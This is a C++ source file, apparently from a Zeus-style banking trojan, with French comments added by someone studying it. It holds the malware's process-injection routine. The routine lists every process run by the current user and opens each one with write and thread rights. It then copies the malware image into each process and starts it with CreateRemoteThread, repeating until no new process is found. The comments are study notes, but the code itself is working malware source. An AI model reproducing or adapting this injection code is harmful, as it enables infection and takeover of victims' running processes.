#include <windows.h>
#include <tlhelp32.h> //ToolHelp32 permet de prendre un snapshot des processus
#include <wininet.h> //API qui permet à d'accéder à internet avec notamment HTTP, FTP ...
 
#include "defines.h"
#include "MainCore.h"
#include "MainInject.h"
 
#include "..\common\debug.h"
#include "..\common\process.h"
 
extern const char baseConfigSource[sizeof(BASECONFIG)] = {'B', 'A', 'S', 'E', 'C', 'O', 'N', 'F', 'I', 'G'};
 
 
static bool injectMalwareToProcess(DWORD pid, HANDLE processMutex, DWORD proccessFlags)
{
  bool ok = false;
// teste d’avoir accès au processus pid (à partir de kernel32, processus système) avec ces droits, (test de vulnérabilité)
  HANDLE process = CWA(kernel32, OpenProcess)(PROCESS_QUERY_INFORMATION |    
                                              PROCESS_VM_OPERATION |
                                              PROCESS_VM_WRITE |
                                              PROCESS_VM_READ |
                                              PROCESS_CREATE_THREAD |
                                              PROCESS_DUP_HANDLE,
                                              FALSE, pid);
 // si on réussit  à avoir accès
  if(process != NULL)
  {
void *newImage = MainCore::initNewModule(process, processMutex, proccessFlags); // créer une image de pid
    if(newImage != NULL)
    {
      LPTHREAD_START_ROUTINE proc = (LPTHREAD_START_ROUTINE)((LPBYTE)newImage + (DWORD_PTR)((LPBYTE)MainCore::_injectEntryForThreadEntry - (LPBYTE)coreData.modules.current));
// create a thread that runs in the virtual address space of kernel 32, genre ça copie le processus précédent ?
      HANDLE thread = CWA(kernel32, CreateRemoteThread)(process, NULL, 0, proc, NULL, 0, NULL);
 
      if(thread != NULL)
      {
        WDEBUG2(WDDT_INFO, "newImage=0x%p, thread=0x%08X", newImage, thread);
        // attend 10 sec, si pas reussi a créer le remote thread alors pb
if(CWA(kernel32, WaitForSingleObject)(thread, 10 * 1000) != WAIT_OBJECT_0)
        {
          WDEBUG2(WDDT_WARNING, "Failed to wait for thread end, newImage=0x%p, thread=0x%08X", newImage, thread);
        }
// ferme l’open object
        CWA(kernel32, CloseHandle)(thread);
        ok = true; // on a réussi à infecter le processus pid 
      }
      else // si thread = NULL
      {
        WDEBUG1(WDDT_ERROR, "Failed to create remote thread in process with id=%u.", pid); // relache la memoire 
        CWA(kernel32, VirtualFreeEx)(process, newImage, 0, MEM_RELEASE);
      }
    }
#   if(BO_DEBUG > 0)
    // si (newImage = NULL)
    else WDEBUG1(WDDT_ERROR, "Failed to alloc code in process with id=%u.", pid);
#   endif
 // ferme l’open object
    CWA(kernel32, CloseHandle)(process);
  }
#if(BO_DEBUG > 0)
// si process = NULL
  else WDEBUG1(WDDT_ERROR, "Failed to open process with id=%u.", pid);
#endif
  return ok;
}
 
static bool InjectMalware(void)
{
}
 
void MainInject::init(void)
{
 
}
 
void MainInject::uninit(void)
{
 
}
 
bool MainInject::_injectToAll(void)
{
  bool ok = false;
 
  WDEBUG0(WDDT_INFO, "Listing processes...");   
 
  LPDWORD injectedPids    = NULL; //pointeur to a DWORD -- tableau qui contiendra les pid des processus
  DWORD injectedPidsCount = 0; //mot de 32 bits
  DWORD newProcesses; //mot de 32 bits
 
  do
  {
    HANDLE snap = CWA(kernel32, createToolhelp32Snapshot) (TH32CS_SNAPPROCESS, 0);   //CreateToolhelp32Snapshot permet de prendre un snapshot des processus du systeme. Handle est l'indice référencant la structure retournée par l'API windows.

    newProcesses = 0; //creer un processus bidon
 
    if(snap != INVALID_HANDLE_VALUE) //Si la structure accessible par le HANDLE snap est valide
    {
      PROCESSENTRY32W pe; //structure qui décrit une entrée d'une liste des processus
      pe.dwSize = sizeof(PROCESSENTRY32W); //On set la taille de la structure avant de lutiliser
 
      if(CWA(kernel32, Process32FirstW)(snap, &pe))do //Process32FirstW apermet davoir un snapshot de la liste des processus apres avoir appeller lapi. 
//enregistre la liste des process capturés par snap dans la liste pe
      {
        if(pe.th32ProcessID > 0 && pe.th32ProcessID != coreData.pid) //si pid est valide est nest pas le procesuss maitre
        {
          TOKEN_USER *tu;
          DWORD sessionId;
          DWORD sidLength;
 // si le process a deja été infecté, on skip
          for(DWORD i = 0; i < injectedPidsCount; i++)
if(injectedPids[i] == pe.th32ProcessID)goto SKIP_INJECT;
 // un mutex = évite que des ressources partagées d'un système ne soient utilisées en même temps.
          HANDLE mutexOfProcess = MainCore::createMutexOfProcess(pe.th32ProcessID); //Definit un objet mutex  sur le processus
          if(mutexOfProcess == NULL)goto SKIP_INJECT;
 
          if((tu = Process::_getUserByProcessId(pe.th32ProcessID, &sessionId)) != NULL)//Recupere lutilisateur en fct du pid du processus. tu = lutilisateur correspondant
          {
            //WDEBUG2(WDDT_INFO, "sessionId=\"%u\", coreData.currentUser.id=\"%u\"", sessionId, coreData.currentUser.id);
//si l’utilisateur est actuellement connecté
            if(sessionId == coreData.currentUser.sessionId &&
               (sidLength = CWA(advapi32, GetLengthSid)(tu->User.Sid)) == coreData.currentUser.sidLength &&
               Mem::_compare(tu->User.Sid, coreData.currentUser.token->User.Sid, sidLength) == 0)//si les octets sont les memes (meme identifiant de securiter (sid)...)
            {
// enregistre le pid du process dans la liste des pid infectés (etonnant car on l’a pas encore infecté)
              if(Mem::reallocEx(&injectedPids, (injectedPidsCount + 1) * sizeof(DWORD)))
              { //resize la structure avc plus de place 
                injectedPids[injectedPidsCount++] = pe.th32ProcessID;
                newProcesses++;
 
                WDEBUG1(WDDT_INFO, "pe.th32ProcessID=%u", pe.th32ProcessID);
 // fonction au dessus: check les vulnérabilités et infecte le process
                if(injectMalwareToProcess(pe.th32ProcessID, mutexOfProcess, 0))ok = true;
              }
#             if(BO_DEBUG > 0)
              else WDEBUG0(WDDT_ERROR, "Failed to realloc injectedPids.");
#             endif
            }
            Mem::free(tu); //libere le tocken user
          }
 
          CWA(kernel32, CloseHandle)(mutexOfProcess);
 
SKIP_INJECT:;
        }
      }
      while(CWA(kernel32, Process32NextW)(snap, &pe));
 
      CWA(kernel32, CloseHandle)(snap);
    }
#   if(BO_DEBUG > 0)
    else WDEBUG0(WDDT_ERROR, "Failed to list processes.");
#   endif
  }
  while(newProcesses != 0);
 
  Mem::free(injectedPids);
 
  return ok;
}

